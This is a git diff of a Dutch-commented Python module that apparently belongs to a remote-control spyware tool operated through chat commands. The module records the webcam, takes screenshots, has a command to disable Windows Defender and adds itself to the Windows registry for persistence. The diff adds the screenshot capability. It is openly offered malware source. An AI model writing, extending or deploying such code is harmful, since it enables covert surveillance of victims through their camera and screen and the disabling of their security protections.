@@ -1,9 +1,10 @@
 # Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
-import cv2, os, time, subprocess, sys, ctypes, winreg
+import cv2, os, time, subprocess, sys, ctypes, winreg, re
+from PIL import Image, ImageGrab
 
 
 # functie die afgedraaid wordt om de banner te maken
-def get_banner() -> str:
+def make_banner() -> str:
     """
     Geeft de ASCII banner terug als string.
     """
@@ -39,6 +40,13 @@ Viresh & Muazma
 """
 
 
+# verstuur de banner
+def get_banner() -> str:
+    text = make_banner()
+    # re.sub zorgt ervoor dat speciale tekens te zien zijn in markdown codeblock
+    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)
+
+
 # functie die een lijst met alle commands terug geeft
 def get_command_list() -> str:
     """
@@ -46,7 +54,8 @@ def get_command_list() -> str:
     """
     return r"""
 Command Lijst:
-/webcam         -   opent de webcam
+/webcam         -   Maak een 5 seconde webcam opname
+/ss             -   Maak een screenshot van het scherm
 /stopdefender   -   Windows Defender uitgeschakelen
 """
 
@@ -55,7 +64,7 @@ Command Lijst:
 # source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
 def get_camRecording():
     # folder waar de video opgeslagen wordt
-    save_dir = './videos'
+    save_dir = './media'
     os.makedirs(save_dir, exist_ok=True)
 
     # Bestandsnaam en opslagpad aangeven
@@ -140,3 +149,18 @@ def add_to_registry(program_name):
 
     except Exception as e:
         print(f"Fout bij toevoegen aan het register: {e}")
+
+
+# Maak een screenshot van het scherm
+def get_screen():
+    save_dir = './media'
+    os.makedirs(save_dir, exist_ok=True)
+
+    # Bestandsnaam en opslagpad
+    filename = 'screenshot.png'
+    filepath = os.path.join(save_dir, filename)
+
+    screenshot = ImageGrab.grab()
+    screenshot.save(filepath, "PNG")
+
+    return "screenshot gemaakt"
